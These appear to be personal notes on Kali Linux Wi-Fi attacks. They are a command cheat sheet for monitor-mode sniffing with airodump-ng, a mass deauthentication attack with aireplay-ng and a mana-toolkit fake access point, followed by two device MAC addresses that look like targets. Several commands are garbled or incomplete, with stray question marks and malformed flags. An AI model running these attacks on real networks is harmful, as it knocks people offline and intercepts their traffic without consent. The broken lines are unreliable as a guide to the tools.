# kali

iwconfig wlan0
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig wlan0
airodump-ng wlan0
'ctrl-c' stop sniffing
ID-power-beacons
airodump-ng --channel[channel] --bssid[] -write
airodump-ng --channel 2 --bssid[] --write test -apcwlan0 ???????????????
wireshark open file ??????????

deauth attack--disconnects device from network
spoof our MAC address to the target client MAC address (pretend to be him)
send deauthentication packet to router
simultaneously spook our MAC address to the access point MAC address (router) and tell the target client you need to re-authenticate yourself

airodump-ng --channel[] --bssid[] wlan0
aireplay-ng --deauth 10000 -a -c wlan0

Fake access point (honey pot)
apt-get install mana-toolkit
gedit /etc/mana-toolkit/host apd-mana.conf
gedit /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh

 phone DC:EF:09:D0:A8:02
 ABX C0:56:27:71:8E:24
